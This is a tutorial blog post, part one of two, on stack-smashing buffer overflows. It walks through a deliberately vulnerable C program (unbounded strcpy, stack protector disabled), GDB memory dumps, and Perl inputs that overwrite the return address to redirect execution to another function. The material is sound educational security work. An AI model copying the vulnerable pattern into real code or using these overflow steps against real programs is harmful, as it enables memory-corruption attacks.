+++
title = "On Stack Smashing, Part One"
date = "2019-04-09T20:30:35-04:00"

+++

[Stack smashing] is accomplished by exploiting a running process by injecting executable code or taking control of the instruction pointer in order to have it do something it wasn't designed to do.  This is usually accomplished by executing a stack-based buffer overflow, or overrun, whereby a contiguous area of memory is filled up and overflowed into the adjacent memory locations.

> This is also known as arbitrary code execution.

There have been security measures put in place both at the hardware ([NX bit]) and software ([ASLR], [stack canaries]) layers to prevent these, but any subscriber to an OS bug mailing list will know that these exploits still happen frequently.

I posit that taking the time to understand how and why these exploits work is an excellent educational experience, whether one codes in "low-level" language such as C/C++ or a high-level interpreted language such as Python or JavaScript.

For example, to implement a buffer overflow attack, it is necessary to have at least a basic understanding of the following (in no specific order):

- memory layout
- assembly
- C
- [GDB]

In this article, I'm going to assume a certain familiarity with the basics of the aforementioned, so if you are completely new to any one of them, I suggest finding a tutorial to get you up to speed.

Let's get started.

## Stack-based Buffer Overflow Example

Here's a simple and contrived example, which is close to the canonical example you'll see on most websites that demonstrate the technique:

```c
#include <stdio.h>
#include <string.h>

void foo(char *s) {
    char buf[10];
    strcpy(buf, s);
    printf("%s\n", buf);
}

int main(int argc, char **argv) {
    foo(argv[1]);
    return 0;
}
```

The idea is to give the program input that is larger than the length that the `buf` buffer expects.  By overwriting adjacent memory, a clever hacker can gain control of the process and possibly even the machine.

For example, since there is no bounds checking, the call to `strcpy` can overflow the `buf` buffer if the function parameter `s` is larger than 10 bytes.  Let's test it.

> The [`strcpy` man page] warns that the function is susceptible to a buffer overrun and that the recommended function call is `strncpy`, where the programmer specifies the length of the copy.

```bash
$ gcc -o cat_pictures cat_pictures.c
$ ./cat_pictures foobar
foobar
$ ./cat_pictures AAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAA
*** stack smashing detected ***: <unknown> terminated
Aborted (core dumped)
```

You can see that the character array `foobar`, being six bytes in length, is printed to `stdout` without a complaint.  The second example, however, is a different story.  The "string" ([there are no strings in C]) is larger than the buffer, and C will continue to happily write the characters into the adjacent memory, corrupting it and causing a runtime error.

Let's compile that again with a flag to turn off the memory protection:

```bash
$ gcc -fno-stack-protector -o cat_pictures cat_pictures.c
$ ./cat_pictures AAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

We now just get a segfault.  That's better.

> The **`stack smashing detected`** error is because the x86 64-bit architecture on my Linux machine will protect the stack from buffer overruns by default.  You shouldn't need the [`-fno-stack-protector`] flag when compiling on a 32-bit machine.

So, what is happening here?  Let's recompile for debugger symbol support and run it in a GDB session:

<pre>
$ gcc -ggdb3 -fno-stack-protector -o cat_pictures cat_pictures.c
$ gdb cat_pictures
Reading symbols from cat_pictures...done.
<span style="color: green;">(gdb)</span> l 1
1       #include &lt;stdio.h&gt;
2       #include &lt;string.h&gt;
3
4       void foo(char *s) {
5           char buf[10];
6           strcpy(buf, s);
7           printf("%s\n", buf);
8       }
9
10      int main(int argc, char **argv) {
<span style="color: green;">(gdb)</span>
11          foo(argv[1]);
12          return 0;
13      }
14
<span style="color: green;">(gdb)</span> b 5
Breakpoint 1 at 0x1151: file cat_pictures.c, line 6.
<span style="color: green;">(gdb)</span> b 7
Breakpoint 2 at 0x1164: file cat_pictures.c, line 7.
<span style="color: green;">(gdb)</span> r foobar
Starting program: /home/btoll/cat_pictures foobar

Breakpoint 1, foo (s=0x7fffffffe304 "foobar") at cat_pictures.c:6
6           strcpy(buf, s);
<span style="color: green;">(gdb)</span>
</pre>

Ok, here I've listed the program, set two breakpoints (one before the character array is copied into the buffer and one after) and ran the program with the parameter "foobar".

Let's look at the memory layout.  I'll dump the first 16 words (64 bytes) starting from the stack pointer. This displays the memory going down the stack towards the higher memory addresses.  I know, that's confusing and unintuitive, but the stack grows *up*, not down.:

<pre>
<span style="color: green;">(gdb)</span> x/16xw $rsp
0x7fffffffde40: 0x00000000      0x00000000      0xffffe303      0x00007fff
0x7fffffffde50: 0xf7fe39b0      0x00007fff      0x00000000      0x00000000
0x7fffffffde60: 0xffffde80      0x00007fff      0x55555195      0x00005555
0x7fffffffde70: 0xffffdf68      0x00007fff      0x00000000      0x00000002
<span style="color: green;">(gdb)</span>
</pre>

Where is the base pointer pointing?

<pre>
<span style="color: green;">(gdb)</span> x $rbp
0x7fffffffde60: 0xffffde80
<span style="color: green;">(gdb)</span>
</pre>

The 64-bit architecture moves the caller's function parameters into CPU registers, and we can find ours in the `rax` register:

<pre>
<span style="color: green;">(gdb)</span> x/s $rax
0x7fffffffe304: "foobar"
<span style="color: green;">(gdb)</span>
</pre>

And the location and value of `buf`:

<pre>
<span style="color: green;">(gdb)</span> x buf
0x7fffffffde56: 0x00000000
<span style="color: green;">(gdb)</span> x/s buf
0x7fffffffde56: ""
<span style="color: green;">(gdb)</span>
</pre>

The compiler allocated 10 bytes for the buffer:

<pre>
<span style="color: green;">(gdb)</span> p $rbp-buf
$1 = 10
<span style="color: green;">(gdb)</span>
</pre>

Let's look again at this block of memory with the important bytes highlighted:

<pre>
<span style="color: green;">(gdb)</span> x/16xw $rsp
0x7fffffffde40: <span style="color: red;">0x00000000</span>      0x00000000      0xffffe303      0x00007fff
0x7fffffffde50: 0xf7fe39b0      0x<span style="color: yellow;">0000</span>7fff      <span style="color: yellow;">0x00000000</span>      <span style="color: yellow;">0x00000000</span>
0x7fffffffde60: <span style="color: green;">0xffffde80</span>      0x00007fff      <span style="color: brown;">0x55555195</span>      0x00005555
0x7fffffffde70: 0xffffdf68      0x00007fff      0x00000000      0x00000002
<span style="color: green;">(gdb)</span>
</pre>

- red - stack pointer (`rsp`)
- green - base pointer (`rbp`)
- brown - return value
- yellow - `buf` local variable

The 18 bytes between the stack pointer and `buf` are noise, as are the 4 bytes located between the base pointer and the return value.

> See my post [On Debugging with GDB] if you're confused about any of this.

How do I know that the value pointed at by address `0x7fffffffde68` is the return value?  I simply disassembled the `main` function and looked at the address right after the call to `foo`, which the compiler would have pushed onto the stack prior to the function prologue as the part of the new stack frame:

<pre>
<span style="color: green;">(gdb)</span> disass main
Dump of assembler code for function main:
   0x0000555555555173 <+0>:     push   rbp
   0x0000555555555174 <+1>:     mov    rbp,rsp
   0x0000555555555177 <+4>:     sub    rsp,0x10
   0x000055555555517b <+8>:     mov    DWORD PTR [rbp-0x4],edi
   0x000055555555517e <+11>:    mov    QWORD PTR [rbp-0x10],rsi
   0x0000555555555182 <+15>:    mov    rax,QWORD PTR [rbp-0x10]
   0x0000555555555186 <+19>:    add    rax,0x8
   0x000055555555518a <+23>:    mov    rax,QWORD PTR [rax]
   0x000055555555518d <+26>:    mov    rdi,rax
   0x0000555555555190 <+29>:    call   0x555555555145 <foo>
   0x0000555555555195 <+34>:    mov    eax,0x0
   0x000055555555519a <+39>:    leave
   0x000055555555519b <+40>:    ret
End of assembler dump.
<span style="color: green;">(gdb)</span>
</pre>

Now, let's continue onto the second breakpoint:

<pre>
<span style="color: green;">(gdb)</span> c
Continuing.

Breakpoint 2, foo (s=0x7fffffffe303 "foobar") at cat_pictures.c:7
7           printf("%s\n", buf);
<span style="color: green;">(gdb)</span>
</pre>

Our buffer has now been copied into, we inspect the same block of memory again and we exit the program:

<pre>
<span style="color: green;">(gdb)</span> x/s buf
0x7fffffffde56: "foobar"
<span style="color: green;">(gdb)</span> x/16xw $rsp
0x7fffffffde40: 0x00000000      0x00000000      0xffffe303      0x00007fff
0x7fffffffde50: 0xf7fe39b0      0x<span style="color: yellow;">6f66</span>7fff      <span style="color: yellow;">0x7261626f</span>      0x000000<span style="color: yellow;">00</span>
0x7fffffffde60: 0xffffde80      0x00007fff      <span style="color: brown;">0x55555195</span>      0x00005555
0x7fffffffde70: 0xffffdf68      0x00007fff      0x00000000      0x00000002
<span style="color: green;">(gdb)</span> c
Continuing.
foobar
[Inferior 1 (process 26468) exited normally]
<span style="color: green;">(gdb)</span>
</pre>

> The highlighted byte furthest to the right is the null byte added by `strcpy`.  Essentially, "foobar" + "\0".

Ok, now let's make it more interesting by attempting to copy in more than 10 bytes:

<pre>
<span style="color: green;">(gdb)</span> r AAAAAAAAAAAAAAAAA
Starting program: /home/btoll/cat_pictures AAAAAAAAAAAAAAAAA

Breakpoint 1, foo (s=0x7fffffffe2f8 'A' <repeats 17 times>) at cat_pictures.c:6
6           strcpy(buf, s);
<span style="color: green;">(gdb)</span> c
Continuing.

Breakpoint 2, foo (s=0x7fffffffe2f8 'A' <repeats 17 times>) at cat_pictures.c:7
7           printf("%s\n", buf);
<span style="color: green;">(gdb)</span> x/16xw $rsp
0x7fffffffde30: 0x00000000      0x00000000      0xffffe2f8      0x00007fff
0x7fffffffde40: 0xf7fe39b0      0x<span style="color: yellow;">4141</span>7fff      <span style="color: yellow;">0x41414141</span>      <span style="color: yellow;">0x41414141</span>
0x7fffffffde50: <span style="color: yellow;">0x41414141</span>      <span style="color: yellow;">0x00414141</span>      <span style="color: brown;">0x55555195</span>      0x00005555
0x7fffffffde60: 0xffffdf58      0x00007fff      0x00000000      0x00000002
<span style="color: green;">(gdb)</span> i r rbp
rbp            0x7fffffffde50      0x7fffffffde50
<span style="color: green;">(gdb)</span> c
Continuing.
AAAAAAAAAAAAAAAAA

Program received signal SIGBUS, Bus error.
main (argc=<error reading variable: Cannot access memory at address 0x4141414141413d>, argv=<error reading variable: Cannot access memory at address 0x41414141414131>) at cat_pictures.c:13
13      }
<span style="color: green;">(gdb)</span>
</pre>

After continuing to the second breakpoint, we can see that we've overrun the size of our buffer and spilled into the adjacent memory.  The program prints, but is unable to exit gracefully.

Notice, however, that we haven't actually rewritten the return value (highlighted in brown), which is the objective of a buffer overflow exploit.  To do so, we'd need to run the program with a longer input "string".  But how long?

Well, from out previous testing, we know that `buf` starts at address `0x7fffffffde56` and the return value starts at address `0x7fffffffde68`.  So:

<pre>
<span style="color: green;">(gdb)</span> p 0x7fffffffde68-0x7fffffffde56
$2 = 18
<span style="color: green;">(gdb)</span>
</pre>

Let's try it with a buffer length of 18 bytes and clear the first breakpoint:

<pre>
<span style="color: green;">(gdb)</span> r $(perl -e 'print "A"x18')
Starting program: /home/btoll/cat_pictures $(perl -e 'print "A"x18')

Breakpoint 1, foo (s=0x7fffffffe2f7 'A' <repeats 18 times>) at cat_pictures.c:6
6           strcpy(buf, s);
<span style="color: green;">(gdb)</span> clear
Deleted breakpoint 1
<span style="color: green;">(gdb)</span> c
Continuing.

Breakpoint 2, foo (s=0x7fffffffe2f7 'A' <repeats 18 times>) at cat_pictures.c:7
7           printf("%s\n", buf);
<span style="color: green;">(gdb)</span> x/16xw $rsp
<span style="color: green;">(gdb)</span> x/16xw $rsp
0x7fffffffde30: 0x00000000      0x00000000      0xffffe2f7      0x00007fff
0x7fffffffde40: 0xf7fe39b0      0x<span style="color: yellow;">4141</span>7fff</span>      <span style="color: yellow;">0x41414141</span>      <span style="color: yellow;">0x41414141</span>
0x7fffffffde50: <span style="color: yellow;">0x41414141</span>      <span style="color: yellow;">0x41414141</span>      <span style="color: brown;">0x555551</span><span style="color: yellow;">00</span>      0x00005555
0x7fffffffde60: 0xffffdf58      0x00007fff      0x00000000      0x00000002
<span style="color: green;">(gdb)</span>
</pre>

Wait a minute, what happened to the return address?  We gave it a character array of 18 bytes which should align itself to the left of the return address, which should contain the value `0x55555195`. (again, the location of the next instruction in `main` after the call to `foo`).  Instead, it's pointing to the address at `0x55555100`.  Wtf?

Again, recall that any character array must end with a null byte.  `strcpy` will automatically add that null byte when it copies from source to destination buffer.  If we look closer, we see that that's exactly what happened:  the 18 bytes + the 1 null byte.<!--, and GDB will print the values in [little-endian] order.-->

<!--
We can verify this by printing the address a byte at a time, which will print in big-endian order:

<pre>
<span style="color: green;">(gdb)</span> x/4b 0x7fffffffde58
0x7fffffffde58: 0x00    0x51    0x55    0x55
<span style="color: green;">(gdb)</span>
</pre>
-->

So, we just need to add another 4 bytes to account for the whole memory address:

<pre>
<span style="color: green;">(gdb)</span> r $(perl -e 'print "A"x22')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/btoll/cat_pictures $(perl -e 'print "A"x22')

Breakpoint 2, foo (s=0x7fffffffe2f3 'A' <repeats 22 times>) at cat_pictures.c:7
7           printf("%s\n", buf);
<span style="color: green;">(gdb)</span> x/16xw $rsp
0x7fffffffde30: 0x00000000      0x00000000      0xffffe2f3      0x00007fff
0x7fffffffde40: 0xf7fe39b0      0x<span style="color: yellow;">41417fff</span>      <span style="color: yellow;">0x41414141</span>      <span style="color: yellow;">0x41414141</span>
0x7fffffffde50: <span style="color: yellow;">0x41414141</span>      <span style="color: yellow;">0x41414141</span>      <span style="color: yellow;">0x41414141</span>      0x000055<span style="color: yellow;">00</span>
0x7fffffffde60: 0xffffdf58      0x00007fff      0x00000000      0x00000002
<span style="color: green;">(gdb)</span> c
Continuing.
AAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000550041414141 in ?? ()
<span style="color: green;">(gdb)</span>
</pre>

Now that we've increased our input size, we can see that it's correctly overflowing the entire return value.

Let's now look at preparing an exploit that will actually do something, instead of just crashing the program.

> By the way, why am I using Perl?  Obviously, you can use any programming language you like that's installed on the machine, but most Linux distros will have Perl installed by default, and there are environments where it could be the only scripting language installed.  Deal with it.

## Controlling the Return Value

Now that we've seen how to overflow a buffer through to the return value, let's actually have it do something (somewhat) interesting.  Let's create a new function, and instead of having the program call it directly, we'll call it indirectly by overflowing the return value with its memory address.

First, we'll create some shell code:

```bash
$ echo and now you do what they told ya | hexdump -v -e '"\\x" 1/1 "%02x"' ; echo
```

Note that there isn't anything malicious here, it's just encoding the string "and now you do what they told ya" into hex and adding the return and newline control characters.  The `-e` flag allows us to pass a format string to [`hexdump`].

The output:

```
\x61\x6e\x64\x20\x6e\x6f\x77\x20\x79\x6f\x75\x20\x64\x6f\x20\x77\x68\x61\x74\x20\x74\x68\x65\x79\x20\x74\x6f\x6c\x64\x20\x79\x61\x0a
```

And the updated `cat_pictures.c` script:

```c
#include <stdio.h>
#include <string.h>

void ratm() {
    printf("\x61\x6e\x64\x20\x6e\x6f\x77\x20\x79\x6f\x75\x20\x64\x6f\x20\x77\x68\x61\x74\x20\x74\x68\x65\x79\x20\x74\x6f\x6c\x64\x20\x79\x61\x0a");
}

void foo(char *s) {
    char buf[10];
    strcpy(buf, s);
    printf("%s\n", buf);
}

int main(int argc, char **argv) {
    foo(argv[1]);
    return 0;
}
```

Recompile and run the program in GDB, breaking at the beginning of the `main` function.  This will allow us to determine the address of the new `ratm` function:

<pre>
$ gdb cat_pictures
Reading symbols from cat_pictures...done.
<span style="color: green;">(gdb)</span> b main
Breakpoint 1 at 0x1195: file cat_pictures.c, line 15.
<span style="color: green;">(gdb)</span> r
Starting program: /home/btoll/cat_pictures

Breakpoint 1, main (argc=1, argv=0x7fffffffdf78) at cat_pictures.c:15
15          foo(argv[1]);
<span style="color: green;">(gdb)</span> x ratm
0x555555555145 <ratm>:  0xe5894855
<span style="color: green;">(gdb)</span>
</pre>

Append the address `0x555555555145` to our input and call the program again (this time from the command line):

```bash
$ ./cat_pictures $(perl -e 'print "A"x18 . "\x45\x51\x55\x55\x55\x55"')
AAAAAAAAAAAAAAAAAAEQUUUU
and now you do what they told ya
Segmentation fault (core dumped)
```

Works.  Weeeeeeeeeeeeeeeeeeeeeeeee

---

Let's look at another example.  In the `dog_adoption.c` program, we have a contrived example, but one that illuminates further how the return value can be controlled to do clever things.  Here, it's using a pointer to overwrite the return address with another which will skip over the rest of the `if` block in `main` and allow us to adopt another dog:

`dog_adoption.c`

<pre>
#include &lt;stdio.h&gt;

int adoption() {
    int current = 4;
    int *ret;

    ret = &amp;current + 5; <span style="color: green;">[1]</span>
    *ret += 24; 	    <span style="color: green;">[2]</span>

    return current;
}

int main() {
    if (adoption() > 2) {
        printf("i'm sorry, you cannot get another dog\n");
        return 0;
    }

    printf("get another dog\n");
}
</pre>

<span style="color: green;">[1]</span> Pointer arithmetic to "forward" the address to that of the return value.

- This is accomplished by inspecting the memory addresses of `adoption`'s local variables.  For example:

	<pre>
	<span style="color: green;">(gdb)</span> x/16xw $rbp-48
	0x7fffffffde10: 0x00000000      0x00000000      0x555551e5      0x00005555
	0x7fffffffde20: 0xf7fe39b0      0x00007fff      0x00000000      0x00000000
	0x7fffffffde30: 0x555551a0      0x00000004      0xffffde48      0x00007fff
	0x7fffffffde40: 0xffffde50      0x00007fff      0x55555186      0x00005555
	<span style="color: green;">(gdb)</span> x/xw &amp;current
	0x7fffffffde34: 0x00000004
	<span style="color: green;">(gdb)</span> x/xw &amp;ret
	0x7fffffffde38: 0xffffde48
	<span style="color: green;">(gdb)</span> x/xw $rbp
	0x7fffffffde40: 0xffffde50
	<span style="color: green;">(gdb)</span>
	</pre>

	- Here, we're dumping the first 48 bytes after the base pointer.  64-bit x86 processors have an optimization that doesn't set the stack pointer unless specified, so that's why I'm not dumping the memory using the `rsp` as the offset as before.
	- The return address is located at address `0x7fffffffde48`, so we simply find the difference between the its address and that of `current` and divide by 4, since we're dealing with `int`s:

			(gdb) p (0x7fffffffde48-0x7fffffffde34) / sizeof(int)
			$3 = 5
			(gdb)

<span style="color: green;">[2]</span> After disassemblying main, adding the bytes to the value of `ret` of the instruction we want to execute, jumping over the ones we don't.

- We'll disassemble `main` and again do some basic arithmetic:

	<pre>
	<span style="color: green;">(gdb)</span> disass main
	Dump of assembler code for function main:
	   0x0000555555555160 <+0>:     push   rbp
	   0x0000555555555161 <+1>:     mov    rbp,rsp
	   0x0000555555555164 <+4>:     mov    eax,0x0
	   0x0000555555555169 <+9>:     call   0x555555555135 &lt;adoption&gt;
	   <span style="color: brown;">0x000055555555516e</span> <+14>:    cmp    eax,0x2
	   0x0000555555555171 <+17>:    jle    0x555555555186 &lt;main+38>
	   0x0000555555555173 <+19>:    lea    rdi,[rip+0xe8e]        # 0x555555556008
	   0x000055555555517a <+26>:    call   0x555555555030 &lt;puts@plt&gt;
	   0x000055555555517f <+31>:    mov    eax,0x0
	   0x0000555555555184 <+36>:    jmp    0x555555555197 &lt;main+55>
	   <span style="color: brown;">0x0000555555555186</span> <+38>:    lea    rdi,[rip+0xea1]        # 0x55555555602e
	   0x000055555555518d <+45>:    call   0x555555555030 &lt;puts@plt&gt;
	   0x0000555555555192 <+50>:    mov    eax,0x0
	   0x0000555555555197 <+55>:    pop    rbp
	   0x0000555555555198 <+56>:    ret
	End of assembler dump.
	<span style="color: green;">(gdb)</span> p 0x0000555555555186-0x000055555555516e
	$12 = 24
	<span style="color: green;">(gdb)</span>
	</pre>

	- Again, here we're just finding the difference between the address we want to jump to and the address of the return value.

Back on the command line, we'll see if it worked:

```bash
$ ./dog_adoption
get another dog
```

Kool moe dee.

## Conclusion

This post is getting rather long, so I'm going to break it up into two pieces.

In [the second half], I'll be showing how to exploit the `cat_pictures.c` program in a more useful, albeit somewhat contrived, way.

## References

- https://nostarch.com/hacking2.htm
- https://insecure.org/stf/smashstack.html

[Stack smashing]: https://en.wikipedia.org/wiki/Stack_buffer_overflow
[NX bit]: https://en.wikipedia.org/wiki/NX_bit
[ASLR]: https://en.wikipedia.org/wiki/Address_space_layout_randomization
[stack canaries]: https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries
[GDB]: https://www.gnu.org/software/gdb/
[`strcpy` man page]: http://man7.org/linux/man-pages/man3/strcpy.3.html
[there are no strings in C]: https://stackoverflow.com/questions/14709323/does-c-have-a-string-type
[`-fno-stack-protector`]: https://stackoverflow.com/questions/10712972/what-is-the-use-of-fno-stack-protector
[little-endian]: https://en.wikipedia.org/wiki/Endianness
[On Debugging with GDB]: /2018/05/19/on-debugging-with-gdb/
[`hexdump`]: http://man7.org/linux/man-pages/man1/hexdump.1.html
[the second half]: /2019/04/10/on-stack-smashing-part-two/
[Hacking: The Art of Exploitation]: https://en.wikipedia.org/wiki/Hacking%3A_The_Art_of_Exploitation

